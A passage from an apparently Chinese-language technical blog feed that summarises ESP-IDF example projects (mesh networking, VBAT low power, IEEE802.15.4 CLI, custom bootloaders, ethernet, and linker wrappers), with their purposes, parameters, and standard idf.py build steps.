客户端</li><li>实验性 NAT 功能</li><li>DHCP 服务器</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>mesh 网络通道</li><li>路由器 SSID 和密码</li><li>mesh softAP 设置</li><li>MQTT 服务器配置</li></ul><p>输出结果：</p><ul><li>mesh 网络状态变化</li><li>内部 IP 地址分配</li><li>MQTT 连接状态</li><li>节点层级和 IP 信息发布</li><li>路由表更新</li><li>事件通知和消息传递 |<br>| <strong>适用场景及典型应用案例</strong> | - 支持 IP 的 mesh 网络</li><li>物联网设备的远程监控和控制</li><li>传感器网络的数据采集和上传</li><li>智能家居系统</li><li>工业物联网应用</li><li>大型建筑的网络覆盖 |</li></ul><h3 id="10-3-manual-networking"><a href="#10-3-manual-networking" class="headerlink" title="10.3 manual_networking"></a>10.3 manual_networking</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>mesh 手动组网示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\mesh\manual_networking</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何禁用 ESP-MESH 的自组织网络功能，手动为节点选择和设置父节点，实现手动组网</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- ESP-MESH API</td></tr></tbody></table><ul><li>WiFi 驱动</li><li>事件处理系统</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>mesh 网络通道</li><li>路由器 SSID 和密码</li><li>mesh softAP 设置</li></ul><p>输出结果：</p><ul><li>mesh 网络状态变化</li><li>父节点扫描和选择结果</li><li>节点层级信息</li><li>RGB 灯颜色变化（ESP-WROVER-KIT 板） |<br>| <strong>适用场景及典型应用案例</strong> | - 需要精确控制网络拓扑的场景</li><li>特殊环境下的网络部署</li><li>测试和调试 mesh 网络</li><li>小型固定网络拓扑</li><li>工业控制网络 |</li></ul><h3 id="10-4-技术要点"><a href="#10-4-技术要点" class="headerlink" title="10.4 技术要点"></a>10.4 技术要点</h3><ul><li><p><strong>mesh 网络特性</strong>：</p><ul><li>支持自组织网络和手动组网</li><li>节点自动分层（根节点、子节点等）</li><li>支持多跳通信</li><li>节点故障自动恢复</li><li>动态路由表更新</li></ul></li><li><p><strong>通信方式</strong>：</p><ul><li>低级别 mesh 消息发送/接收 API</li><li>IP 内部网络通信</li><li>MQTT 消息发布/订阅</li><li>支持 IPv4（不支持 IPv6-only 配置）</li></ul></li><li><p><strong>网络配置</strong>：</p><ul><li>根节点通过 WiFi STA 连接到外部路由器</li><li>根节点创建内部子网并运行 DHCP 服务器</li><li>子节点通过 mesh 连接到根节点</li><li>实验性 NAT 功能实现地址/端口转换</li></ul></li><li><p><strong>设备层级指示</strong>：</p><ul><li>ESP-WROVER-KIT 板上的 RGB 灯显示设备层级</li><li>根节点：粉色</li><li>2 层：黄色</li><li>3 层：红色</li><li>4 层：蓝色</li><li>5 层：绿色</li><li>5 层以上：白色</li></ul></li></ul><h3 id="10-5-构建与运行"><a href="#10-5-构建与运行" class="headerlink" title="10.5 构建与运行"></a>10.5 构建与运行</h3><p>所有 mesh 例程的构建方法基本一致：</p><ol><li>配置项目：<code>idf.py menuconfig</code></li><li>设置 mesh 网络参数、路由器信息和其他配置</li><li>构建项目：<code>idf.py build</code></li><li>烧录到多个开发板：<code>idf.py -p PORT flash monitor</code></li><li>观察 mesh 网络的形成和节点间通信</li></ol><h3 id="10-6-应用场景总结"><a href="#10-6-应用场景总结" class="headerlink" title="10.6 应用场景总结"></a>10.6 应用场景总结</h3><ul><li><strong>internal_communication</strong>：适用于基于 mesh 的设备间直接通信，如灯光控制系统</li><li><strong>ip_internal_network</strong>：适用于需要连接外部网络的 mesh 网络，结合 MQTT 实现远程监控</li><li><strong>manual_networking</strong>：适用于需要精确控制网络拓扑的场景</li></ul><p>这些例程展示了 ESP-MESH 技术的多种应用方式，从简单的设备间通信到复杂的 IP 内部网络，满足不同场景下的 mesh 网络需求。开发者可以根据自己的应用场景选择合适的例程作为基础，进行二次开发和扩展。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——低功耗</title>
    <link href="/ESP32-examples/02.lowpower/"/>
    <url>/ESP32-examples/02.lowpower/</url>
    
    <content type="html"><![CDATA[<h2 id="2-lowpower-目录"><a href="#2-lowpower-目录" class="headerlink" title="2. lowpower 目录"></a>2. lowpower 目录</h2><h3 id="2-1-vbat"><a href="#2-1-vbat" class="headerlink" title="2.1 vbat"></a>2.1 vbat</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>低功耗备用电池管理示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\lowpower\vbat</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示ESP芯片在深度睡眠期间使用备用电池（VBAT）的功能，包括自动电源切换、电池电压检测、电池充电和充电管理</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- ESP32-H2/P4 芯片的 VBAT 电源管理功能</td></tr></tbody></table><ul><li>RTC 定时器和深度睡眠功能</li><li>PMU（电源管理单元）自动切换机制</li><li>电池电压检测电路</li><li>电池充电控制电路 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>电池类型（可充电或不可充电）</li><li>VBAT 欠压唤醒阈值</li><li>充电电流限制电阻值</li><li>充电完成检查周期</li><li>充电期间芯片状态（保持活跃、进入轻度睡眠或深度睡眠）</li></ul><p>输出结果：</p><ul><li>初始启动状态</li><li>当前 RTC 时间</li><li>电池电压状态</li><li>充电状态变化</li><li>电源切换信息</li><li>深度睡眠进入和唤醒状态 |<br>| <strong>适用场景及典型应用案例</strong> | - 电池供电的低功耗物联网设备</li><li>需要长时间保持 RTC 计时的设备</li><li>主电源经常断开的应用场景</li><li>电池充电管理系统</li><li>环境监测设备</li><li>智能家居传感器</li><li>可穿戴设备 |</li></ul><h3 id="2-2-技术要点"><a href="#2-2-技术要点" class="headerlink" title="2.2 技术要点"></a>2.2 技术要点</h3><ul><li><p><strong>电源管理功能</strong>：</p><ul><li>深度睡眠期间自动切换到 VBAT 供电</li><li>唤醒时自动切换回主电源供电</li><li>支持不可充电和可充电电池</li><li>电池电压检测和欠压保护</li></ul></li><li><p><strong>充电管理功能</strong>：</p><ul><li>自动检测电池电压并启动充电</li><li>充电电流可配置</li><li>充电完成自动停止</li><li>充电期间芯片状态可选择（活跃、轻度睡眠或深度睡眠）</li><li>充电完成检查周期可配置</li></ul></li><li><p><strong>硬件支持</strong>：</p><ul><li>支持 ESP32-H2 和 ESP32-P4 芯片</li><li>需要带有备用电池的开发板</li><li>支持电池电压检测电路</li><li>支持电池充电电路</li></ul></li><li><p><strong>唤醒机制</strong>：</p><ul><li>RTC 定时器唤醒</li><li>VBAT 欠压唤醒</li><li>充电完成唤醒</li></ul></li></ul><h3 id="2-3-硬件连接"><a href="#2-3-硬件连接" class="headerlink" title="2.3 硬件连接"></a>2.3 硬件连接</h3><ul><li>开发板需要焊接电阻以切换到电池供电</li><li>电池正极连接到 RTC_Battery +</li><li>电池负极连接到 RTC_Battery -</li></ul><h3 id="2-4-构建与运行"><a href="#2-4-构建与运行" class="headerlink" title="2.4 构建与运行"></a>2.4 构建与运行</h3><ol><li>配置项目：<code>idf.py menuconfig</code></li><li>选择电池类型和相关参数</li><li>构建项目：<code>idf.py build</code></li><li>烧录并监控：<code>idf.py -p PORT flash monitor</code></li></ol><h3 id="2-5-应用场景总结"><a href="#2-5-应用场景总结" class="headerlink" title="2.5 应用场景总结"></a>2.5 应用场景总结</h3><p>该例程展示了 ESP 芯片的高级低功耗管理功能，特别适合需要长时间运行在电池供电模式下的物联网设备。通过自动电源切换和电池管理，可以显著延长设备的使用寿命，减少维护成本。</p><p>典型应用包括：</p><ul><li>无线传感器网络节点</li><li>环境监测设备</li><li>智能家居设备</li><li>可穿戴电子产品</li><li>工业监控设备</li><li>野外部署的 IoT 设备</li></ul><p>这个例程提供了一个完整的低功耗电池管理解决方案，开发者可以根据自己的需求进行定制和扩展。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——ieee802154</title>
    <link href="/ESP32-examples/09.ieee802154/"/>
    <url>/ESP32-examples/09.ieee802154/</url>
    
    <content type="html"><![CDATA[<h2 id="9-ieee802154-目录"><a href="#9-ieee802154-目录" class="headerlink" title="9. ieee802154 目录"></a>9. ieee802154 目录</h2><h3 id="9-1-ieee802154-cli"><a href="#9-1-ieee802154-cli" class="headerlink" title="9.1 ieee802154_cli"></a>9.1 ieee802154_cli</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>IEEE802.15.4 命令行示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\ieee802154\ieee802154_cli</td></tr><tr><td><strong>核心功能说明</strong></td><td>提供一个命令行界面，用于配置和管理IEEE802.15.4网络，支持多种命令操作，包括通道设置、CCA配置、收发控制等</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- IEEE802.15.4 子系统 API</td></tr></tbody></table><ul><li>console 组件（命令行界面）</li><li>ESP32-H2/C5/C6 芯片的 IEEE802.15.4 硬件支持</li><li>支持 UART 和 USB Serial/JTAG 控制台输出 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>控制台输出通道（UART 或 USB Serial/JTAG）</li><li>IEEE802.15.4 网络参数（通道、PAN ID、地址等）</li></ul><p>输出结果：</p><ul><li>命令执行状态和结果</li><li>网络配置信息</li><li>收发数据状态</li><li>硬件寄存器信息</li><li>内存使用情况</li><li>芯片和SDK版本信息 |<br>| <strong>适用场景及典型应用案例</strong> | - IEEE802.15.4 网络的开发和调试</li><li>硬件寄存器的直接操作和测试</li><li>无线通信参数的优化和测试</li><li>不同IEEE802.15.4设备之间的兼容性测试</li><li>基于IEEE802.15.4的物联网设备开发 |</li></ul><h3 id="9-2-技术要点"><a href="#9-2-技术要点" class="headerlink" title="9.2 技术要点"></a>9.2 技术要点</h3><ul><li><p><strong>支持的命令类型</strong>：</p><ul><li>网络配置命令（channel, panid, extaddr, shortaddr）</li><li>收发控制命令（rx, tx, txpower）</li><li>硬件控制命令（coordinator, promisc, pending）</li><li>测量和检测命令（cca, ed）</li><li>系统命令（restart, free, heap, version）</li><li>硬件寄存器命令（reg）</li></ul></li><li><p><strong>硬件支持</strong>：</p><ul><li>支持ESP32-H2/C5/C6等IEEE802.15.4芯片</li><li>硬件级别的协调器支持</li><li>硬件级别的混杂模式支持</li><li>能量检测（ED）功能</li></ul></li><li><p><strong>控制台接口</strong>：</p><ul><li>支持UART和USB Serial/JTAG两种输出通道</li><li>命令自动补全和帮助信息</li><li>支持命令缩写和完整格式</li><li>命令历史记录</li></ul></li></ul><h3 id="9-3-主要命令功能"><a href="#9-3-主要命令功能" class="headerlink" title="9.3 主要命令功能"></a>9.3 主要命令功能</h3><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><ul><li><strong>channel</strong>：设置和获取IEEE802.15.4通道号（11-26）</li><li><strong>panid</strong>：设置和获取PAN ID</li><li><strong>extaddr</strong>：设置和获取扩展地址（8字节）</li><li><strong>shortaddr</strong>：设置和获取短地址（2字节）</li></ul><h3 id="收发控制"><a href="#收发控制" class="headerlink" title="收发控制"></a>收发控制</h3><ul><li><strong>rx</strong>：启用/禁用接收模式</li><li><strong>tx</strong>：发送IEEE802.15.4 MAC帧，支持CCA触发</li><li><strong>txpower</strong>：设置和获取发射功率</li></ul><h3 id="硬件控制"><a href="#硬件控制" class="headerlink" title="硬件控制"></a>硬件控制</h3><ul><li><strong>coordinator</strong>：启用/禁用硬件协调器</li><li><strong>promisc</strong>：启用/禁用混杂模式</li><li><strong>pending</strong>：管理待处理地址表和自动待处理模式</li></ul><h3 id="测量和检测"><a href="#测量和检测" class="headerlink" title="测量和检测"></a>测量和检测</h3><ul><li><strong>cca</strong>：配置和获取CCA（空闲信道评估）参数</li><li><strong>ed</strong>：执行能量检测</li></ul><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ul><li><strong>version</strong>：获取芯片和SDK版本</li><li><strong>free</strong>：获取当前可用堆内存</li><li><strong>heap</strong>：获取最小可用堆内存</li></ul><h3 id="9-4-构建与运行"><a href="#9-4-构建与运行" class="headerlink" title="9.4 构建与运行"></a>9.4 构建与运行</h3><ol><li>配置项目：<code>idf.py menuconfig</code></li><li>选择控制台输出通道（可选）</li><li>构建项目：<code>idf.py build</code></li><li>烧录并监控：<code>idf.py -p PORT flash monitor</code></li><li>在命令行中输入 <code>help</code> 查看所有可用命令</li></ol><h3 id="9-5-应用场景总结"><a href="#9-5-应用场景总结" class="headerlink" title="9.5 应用场景总结"></a>9.5 应用场景总结</h3><p>该例程为IEEE802.15.4网络开发提供了一个强大的调试和测试工具，适用于：</p><ul><li>IEEE802.15.4协议栈的开发和验证</li><li>硬件级别的无线通信测试</li><li>不同IEEE802.15.4设备之间的互联互通测试</li><li>基于IEEE802.15.4的物联网应用原型开发</li><li>无线传感器网络的基础测试平台</li></ul><p>通过该例程，开发者可以快速测试和验证IEEE802.15.4网络的各种配置和功能，加速基于IEEE802.15.4的产品开发进程。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——custom_bootloader</title>
    <link href="/ESP32-examples/04.custom_bootloader/"/>
    <url>/ESP32-examples/04.custom_bootloader/</url>
    
    <content type="html"><![CDATA[<h2 id="4-custom-bootloader-目录"><a href="#4-custom-bootloader-目录" class="headerlink" title="4. custom_bootloader 目录"></a>4. custom_bootloader 目录</h2><h3 id="4-1-bootloader-hooks"><a href="#4-1-bootloader-hooks" class="headerlink" title="4.1 bootloader_hooks"></a>4.1 bootloader_hooks</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>引导加载程序钩子示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\custom_bootloader\bootloader_hooks</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何向第二阶段引导加载程序添加钩子函数，在引导加载程序初始化前后执行自定义代码</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- bootloader_hooks.h 中定义的钩子函数接口</td></tr></tbody></table><ul><li>自定义钩子函数实现（hooks.c）</li><li>bootloader初始化相关函数 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>无特定输入参数，通过hooks.c实现钩子函数</li></ul><p>输出结果：</p><ul><li>引导加载程序初始化前显示：”I (24) HOOK: This hook is called BEFORE bootloader initialization”</li><li>引导加载程序初始化后显示：”I (60) HOOK: This hook is called AFTER bootloader initialization”</li><li>应用程序启动显示：”User application is loaded and running.” |<br>| <strong>适用场景及典型应用案例</strong> | - 需要在引导加载过程中执行自定义初始化操作</li><li>引导加载程序阶段的设备状态检查</li><li>自定义引导加载程序日志输出</li><li>硬件初始化或检测 |</li></ul><h3 id="4-2-bootloader-override"><a href="#4-2-bootloader-override" class="headerlink" title="4.2 bootloader_override"></a>4.2 bootloader_override</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>引导加载程序覆盖示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\custom_bootloader\bootloader_override</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何完全覆盖ESP-IDF的第二阶段引导加载程序，实现自定义引导加载逻辑</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- 自定义引导加载程序实现（bootloader_start.c）</td></tr></tbody></table><ul><li>KConfig配置系统</li><li>链接器脚本 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>通过KConfig定义自定义引导加载程序消息</li><li>可通过CMake条件控制是否覆盖引导加载程序</li></ul><p>输出结果：</p><ul><li>引导加载程序启动时显示：”[boot] Custom bootloader message defined in the KConfig file.” |<br>| <strong>适用场景及典型应用案例</strong> | - 需要完全自定义引导加载程序逻辑</li><li>实现特殊的引导加载顺序或安全检查</li><li>添加自定义引导加载程序功能</li><li>引导加载程序级别的设备保护 |</li></ul><h3 id="4-3-bootloader-multiboot"><a href="#4-3-bootloader-multiboot" class="headerlink" title="4.3 bootloader_multiboot"></a>4.3 bootloader_multiboot</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>多引导加载程序示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\custom_bootloader\bootloader_multiboot</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何创建一个多引导加载程序，允许用户在启动时选择要运行的应用程序</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- 自定义引导加载程序实现（bootloader_start.c）</td></tr></tbody></table><ul><li>分区表管理</li><li>应用程序选择界面</li><li>键盘输入处理 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>通过partitions.csv定义多个应用分区</li><li>可配置引导菜单样式</li></ul><p>输出结果：</p><ul><li>引导菜单显示所有可用的引导分区</li><li>支持键盘选择和确认操作</li><li>启动所选应用程序 |<br>| <strong>适用场景及典型应用案例</strong> | - 开发多应用程序设备</li><li>支持固件版本切换</li><li>调试和测试多个应用程序</li><li>实现恢复模式和主应用模式切换 |</li></ul><h3 id="4-4-bootloader-extra-dir"><a href="#4-4-bootloader-extra-dir" class="headerlink" title="4.4 bootloader_extra_dir"></a>4.4 bootloader_extra_dir</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>所在文件夹路径</strong></td><td>examples\custom_bootloader\bootloader_extra_dir</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何向引导加载程序构建添加自定义组件目录，实现引导加载程序功能扩展</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- BOOTLOADER_EXTRA_COMPONENT_DIRS CMake属性</td></tr></tbody></table><ul><li>自定义组件实现（extra_component.c）</li><li>引导加载程序钩子机制 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>通过CMakeLists.txt设置BOOTLOADER_EXTRA_COMPONENT_DIRS</li><li>自定义组件实现</li></ul><p>输出结果：</p><ul><li>引导加载程序显示：”I (60) EXTRA: This function is called from an extra component”</li><li>应用程序正常启动 |<br>| <strong>适用场景及典型应用案例</strong> | - 模块化扩展引导加载程序功能</li><li>分离引导加载程序自定义代码</li><li>实现可复用的引导加载程序组件</li><li>简化复杂引导加载程序的维护 |</li></ul><h3 id="4-5-技术要点"><a href="#4-5-技术要点" class="headerlink" title="4.5 技术要点"></a>4.5 技术要点</h3><ul><li>引导加载程序组件命名规则：<ul><li><code>bootloader_components/main</code> - 完全覆盖第二阶段引导加载程序</li><li><code>bootloader_components/any_name</code> - 添加引导加载程序组件和钩子</li></ul></li><li>钩子函数类型：<ul><li>初始化前钩子：在引导加载程序初始化前执行</li><li>初始化后钩子：在引导加载程序初始化后、加载分区前执行</li></ul></li><li>多引导实现：<ul><li>需要自定义分区表</li><li>支持factory分区和多个ota_n分区</li><li>应用程序名称显示为项目名而非分区名</li></ul></li><li>额外组件添加：<ul><li>通过BOOTLOADER_EXTRA_COMPONENT_DIRS CMake属性实现</li><li>支持目录路径或单个组件路径</li></ul></li></ul><h3 id="4-6-构建与运行"><a href="#4-6-构建与运行" class="headerlink" title="4.6 构建与运行"></a>4.6 构建与运行</h3><p>所有custom_bootloader例程的构建方法基本一致：</p><ol><li>配置目标芯片：<code>idf.py set-target esp32</code></li><li>构建项目：<code>idf.py build</code></li><li>烧录并监控：<code>idf.py flash monitor</code></li></ol><h3 id="4-7-应用场景总结"><a href="#4-7-应用场景总结" class="headerlink" title="4.7 应用场景总结"></a>4.7 应用场景总结</h3><ul><li><strong>钩子机制</strong>：适用于需要在引导过程中执行少量自定义代码的场景</li><li><strong>完全覆盖</strong>：适用于需要深度定制引导加载程序的场景</li><li><strong>多引导</strong>：适用于需要在设备上运行多个应用程序的场景</li><li><strong>额外组件</strong>：适用于需要模块化扩展引导加载程序功能的场景</li></ul><p>这些例程展示了ESP-IDF引导加载程序的高度可定制性，允许开发者根据需求灵活扩展或修改引导加载行为。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——ethernet</title>
    <link href="/ESP32-examples/11.ethernet/"/>
    <url>/ESP32-examples/11.ethernet/</url>
    
    <content type="html"><![CDATA[<h2 id="11-ethernet-目录"><a href="#11-ethernet-目录" class="headerlink" title="11. ethernet 目录"></a>11. ethernet 目录</h2><h3 id="11-1-basic"><a href="#11-1-basic" class="headerlink" title="11.1 basic"></a>11.1 basic</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>以太网基本功能示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\ethernet\basic</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示以太网驱动的基本使用方法，包括内部EMAC和SPI以太网模块的初始化、IP获取和网络通信</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- esp_eth 组件</td></tr></tbody></table><ul><li>esp_netif 组件</li><li>以太网驱动初始化函数</li><li>DHCP 客户端</li><li>支持多种PHY芯片（LAN8720, IP101, DP83848, RTL8201）</li><li>支持SPI以太网模块（DM9051, W5500, KSZ8851SNL） |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>通过menuconfig配置以太网类型（内部EMAC或SPI模块）</li><li>PHY地址、复位GPIO等硬件配置</li><li>SPI时钟速率和GPIO引脚分配</li></ul><p>输出结果：</p><ul><li>以太网初始化状态</li><li>链路状态变化</li><li>硬件MAC地址</li><li>获取的IP地址、子网掩码和网关</li><li>网络连接状态 |<br>| <strong>适用场景及典型应用案例</strong> | - 以太网通信的基础开发模板</li><li>多以太网接口配置示例</li><li>不同PHY芯片的兼容测试</li><li>SPI以太网模块的使用演示</li><li>IoT设备的有线网络连接 |</li></ul><h3 id="11-2-iperf"><a href="#11-2-iperf" class="headerlink" title="11.2 iperf"></a>11.2 iperf</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>以太网性能测试示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\ethernet\iperf</td></tr><tr><td><strong>核心功能说明</strong></td><td>使用iperf协议测试以太网的吞吐量和带宽，支持UDP模式的上行和下行测试</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- esp_eth 组件</td></tr></tbody></table><ul><li>esp_netif 组件</li><li>iperf 协议实现</li><li>console 组件（命令行界面）</li><li>支持内部EMAC和SPI以太网模块 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>通过menuconfig配置以太网类型和硬件参数</li><li>命令历史记录存储设置</li><li>iperf测试参数（模式、持续时间、报告间隔等）</li></ul><p>输出结果：</p><ul><li>上行带宽测试结果（ESP32作为客户端，PC作为服务器）</li><li>下行带宽测试结果（ESP32作为服务器，PC作为客户端）</li><li>带宽数据（Mbps）</li><li>数据包丢失率</li><li>抖动情况 |<br>| <strong>适用场景及典型应用案例</strong> | - 以太网性能评估</li><li>网络优化和调试</li><li>不同硬件配置下的性能比较</li><li>产品开发中的网络性能测试</li><li>网络设备的基准测试 |</li></ul><h3 id="11-3-ptp"><a href="#11-3-ptp" class="headerlink" title="11.3 ptp"></a>11.3 ptp</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>以太网精确时间同步示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\ethernet\ptp</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示使用Precision Time Protocol (PTP) 在以太网网络中实现高精度时间同步，支持主从模式</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- esp_eth 组件（支持硬件时间戳）</td></tr></tbody></table><ul><li>PTPv2 协议实现</li><li>L2 TAP 接口</li><li>GPIO 脉冲生成</li><li>Nuttx PTPD 移植 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>PTP 角色（主设备或从设备）</li><li>脉冲宽度和频率配置</li><li>以太网硬件参数</li><li>PTP 客户端延迟请求设置</li></ul><p>输出结果：</p><ul><li>PTP 同步状态</li><li>本地时间和远程时间对比</li><li>时间跳变信息</li><li>GPIO 脉冲序列</li><li>同步精度统计 |<br>| <strong>适用场景及典型应用案例</strong> | - 工业自动化系统中的时间同步</li><li>分布式控制系统</li><li>高精度数据采集网络</li><li>多媒体流同步</li><li>测试和测量设备网络 |</li></ul><h3 id="11-4-技术要点"><a href="#11-4-技术要点" class="headerlink" title="11.4 技术要点"></a>11.4 技术要点</h3><ul><li><p><strong>硬件支持</strong>：</p><ul><li>内部EMAC：支持RMII接口，固定引脚分配</li><li>SPI以太网模块：支持多种型号，可灵活配置引脚</li><li>硬件时间戳：ESP32-P4 EMAC支持精确的时间戳生成</li></ul></li><li><p><strong>多接口支持</strong>：</p><ul><li>支持同时使用内部EMAC和SPI以太网模块</li><li>支持多个SPI以太网模块共享同一SPI接口</li></ul></li><li><p><strong>PTP实现</strong>：</p><ul><li>基于IEEE 1588-2008标准（PTPv2）</li><li>硬件时间戳确保高精度同步</li><li>支持L2层PTP传输</li></ul></li><li><p><strong>常见配置</strong>：</p><ul><li>通过menuconfig配置以太网类型和硬件参数</li><li>支持不同PHY芯片的自动检测和配置</li><li>SPI时钟速率和DMA缓冲区大小可调</li></ul></li></ul><h3 id="11-5-构建与运行"><a href="#11-5-构建与运行" class="headerlink" title="11.5 构建与运行"></a>11.5 构建与运行</h3><p>所有ethernet例程的构建方法基本一致：</p><ol><li>配置项目：<code>idf.py menuconfig</code></li><li>构建项目：<code>idf.py build</code></li><li>烧录并监控：<code>idf.py -p PORT flash monitor</code></li></ol><h3 id="11-6-应用场景总结"><a href="#11-6-应用场景总结" class="headerlink" title="11.6 应用场景总结"></a>11.6 应用场景总结</h3><ul><li><strong>basic</strong>：适用于以太网通信的基础开发和多接口配置</li><li><strong>iperf</strong>：适用于网络性能测试和优化</li><li><strong>ptp</strong>：适用于需要高精度时间同步的工业和测试应用</li></ul><p>这些例程展示了ESP-IDF以太网功能的全面支持，从基本通信到高性能测试，再到高精度时间同步，满足不同应用场景的需求。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——build_system</title>
    <link href="/ESP32-examples/06.build_system/"/>
    <url>/ESP32-examples/06.build_system/</url>
    
    <content type="html"><![CDATA[<h2 id="6-build-system-目录"><a href="#6-build-system-目录" class="headerlink" title="6. build_system 目录"></a>6. build_system 目录</h2><h3 id="6-1-wrappers"><a href="#6-1-wrappers" class="headerlink" title="6.1 wrappers"></a>6.1 wrappers</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>使用包装器重新定义IDF函数</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\build_system\wrappers</td></tr><tr><td><strong>核心功能说明</strong></td><td>展示如何使用链接器包装器（wrapper）功能重新定义或覆盖ESP-IDF和引导加载程序中的任何公共函数，用于修改默认函数行为或扩展功能</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- bootloader_print_banner（引导加载程序函数）</td></tr></tbody></table><ul><li>esp_restart（ESP-IDF函数）</li><li>链接器选项：-Wl,–wrap=function_name |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>无特定输入参数，通过链接器选项配置要包装的函数</li></ul><p>输出结果：</p><ul><li>引导加载程序启动时显示自定义消息</li><li>重启前显示自定义消息</li><li>成功重新定义函数的日志输出 |<br>| <strong>适用场景及典型应用案例</strong> | - 需要修改ESP-IDF或引导加载程序默认行为但不希望修改源代码的场景</li><li>功能扩展和定制开发</li><li>调试和测试场景，临时替换函数实现</li><li>跨版本兼容处理 |</li></ul><h3 id="6-2-技术要点"><a href="#6-2-技术要点" class="headerlink" title="6.2 技术要点"></a>6.2 技术要点</h3><ul><li>利用链接器的–wrap选项实现函数包装</li><li>包装函数命名规则：__wrap_function_name</li><li>原函数通过__real_function_name访问</li><li>仅适用于全局函数，静态函数无法被包装</li><li>包装内部函数存在版本兼容性风险</li><li>需注意函数内存位置（IRAM/Flash）的兼容性</li></ul><h3 id="6-3-构建与运行"><a href="#6-3-构建与运行" class="headerlink" title="6.3 构建与运行"></a>6.3 构建与运行</h3><ol><li>设置目标芯片：<code>idf.py set-target esp32c3</code></li><li>构建项目：<code>idf.py build</code></li><li>烧录并监控：<code>idf.py flash monitor</code></li></ol><h3 id="6-4-预期输出"><a href="#6-4-预期输出" class="headerlink" title="6.4 预期输出"></a>6.4 预期输出</h3><p><code> I (30) boot-wrapper: message from a bootloader wrapper [...]Restarting in 5 seconds... Restarting is progress... [...]</code></p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——bluetooth</title>
